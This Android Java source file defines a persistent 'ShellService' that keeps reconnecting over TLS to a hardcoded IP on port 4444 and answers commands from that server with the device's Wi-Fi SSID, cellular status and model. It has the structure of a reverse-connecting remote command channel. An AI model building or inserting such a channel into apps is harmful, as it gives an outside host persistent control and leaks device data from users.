package com.pits.sptassist;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.SocketTimeoutException;
import java.nio.ByteBuffer;
import java.security.KeyStore;
import java.security.SecureRandom;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManagerFactory;

public class ShellService extends Service {

    /* ---------- constants ---------- */
    private static final String TAG         = "ShellService";
    private static final String CHANNEL_ID  = "shell_channel";
    private static final int    NOTIF_ID    = 1;
    private static final String HOST        = "34.29.65.235";
    private static final int    PORT        = 4444;

    /* ---------- state ---------- */
    @Nullable
    private SSLSocket sslSocket;
    private Thread    ioThread;

    /* ---------- life‑cycle ---------- */
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());

        ioThread = new Thread(this::openSecureLoop, "Shell‑IO");
        ioThread.start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // START_STICKY so the system restarts the service if it’s killed.
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (ioThread != null) ioThread.interrupt();
        closeQuietly(sslSocket);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }

    /* ---------- secure socket loop ---------- */
    private void openSecureLoop() {
        while (!Thread.currentThread().isInterrupted()) {
            try {
                connectOnce();
                readCommandLoop();                       // blocks until socket closes
            } catch (SocketTimeoutException ste) {
                Log.w(TAG, "Read timed‑out, reconnecting…");
            } catch (Exception e) {
                Log.e(TAG, "Connection error", e);
            }
            closeQuietly(sslSocket);
            sleep(3_000);                               // wait a bit before retry
        }
    }

    private void connectOnce() throws Exception {
        // 1) Load trust‑store (.bks in res/raw) – NO password
        KeyStore ks = KeyStore.getInstance("BKS");
        try (InputStream is = getResources().openRawResource(R.raw.server_certificate)) {
            ks.load(is, null);
        }

        TrustManagerFactory tmf = TrustManagerFactory.getInstance(
                TrustManagerFactory.getDefaultAlgorithm());
        tmf.init(ks);

        SSLContext sc = SSLContext.getInstance("TLS");
        sc.init(null, tmf.getTrustManagers(), new SecureRandom());

        SSLSocketFactory sf = sc.getSocketFactory();
        sslSocket = (SSLSocket) sf.createSocket(HOST, PORT);
        sslSocket.setSoTimeout(30_000);                 // 30 s read timeout
        sslSocket.startHandshake();

        Log.i(TAG, "TLS socket established to " + HOST + ':' + PORT);
    }

    private void readCommandLoop() throws IOException {
        InputStream  in  = sslSocket.getInputStream();
        OutputStream out = sslSocket.getOutputStream();

        while (!Thread.currentThread().isInterrupted()) {
            /* ---- 1. length‑prefixed command ---- */
            byte[] lenBuf = readFully(in, 4);
            if (lenBuf == null) break;                  // stream closed
            int len = ByteBuffer.wrap(lenBuf).getInt();
            byte[] cmdBuf = readFully(in, len);
            if (cmdBuf == null) break;

            String cmd = new String(cmdBuf);
            String rsp = executeCommand(cmd);

            /* ---- 2. send response ---- */
            byte[] rspBytes = rsp.getBytes();
            ByteBuffer bb = ByteBuffer.allocate(4 + rspBytes.length);
            bb.putInt(rspBytes.length).put(rspBytes);
            out.write(bb.array());
            out.flush();
        }
    }

    /* ---------- helper: read exactly n bytes ---------- */
    @Nullable
    private byte[] readFully(InputStream in, int n) throws IOException {
        byte[] buf = new byte[n];
        int off = 0;
        while (off < n) {
            int r = in.read(buf, off, n - off);
            if (r < 0) return null;                     // closed
            off += r;
        }
        return buf;
    }

    /* ---------- simple command handler ---------- */
    private String executeCommand(String cmd) {
        switch (cmd.toLowerCase()) {
            case "wifi_status":      return getWifiStatus(this);
            case "cellular_status":  return getCellularStatus(this);
            case "device_info":
                return "Brand=" + Build.BRAND + ", Model=" + Build.MODEL;
            default:                 return "Unknown command: " + cmd;
        }
    }

    /* ---------- network helpers ---------- */
    public static String getWifiStatus(Context ctx) {
        WifiManager wm = (WifiManager) ctx.getSystemService(WIFI_SERVICE);
        if (!wm.isWifiEnabled()) return "Wi‑Fi Disabled";
        WifiInfo info = wm.getConnectionInfo();
        return (info.getNetworkId() == -1)
                ? "Wi‑Fi Enabled but not connected"
                : "Wi‑Fi Connected to: " + info.getSSID();
    }

    public static String getCellularStatus(Context ctx) {
        ConnectivityManager cm =
                (ConnectivityManager) ctx.getSystemService(CONNECTIVITY_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            NetworkCapabilities cap = cm.getNetworkCapabilities(cm.getActiveNetwork());
            return (cap != null && cap.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR))
                    ? "Cellular Connected" : "Cellular Not Connected";
        } else {
            android.net.NetworkInfo ni =
                    cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            return (ni != null && ni.isConnected()) ? "Cellular Connected"
                    : "Cellular Not Connected";
        }
    }

    /* ---------- foreground‑service notification ---------- */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Shell background", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle("Secure shell running")
                .setContentText("Maintaining connection to server")
                .setOngoing(true)
                .build();
    }

    /* ---------- tiny utils ---------- */
    private static void closeQuietly(SSLSocket s) {
        if (s != null) try { s.close(); } catch (IOException ignored) {}
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }
}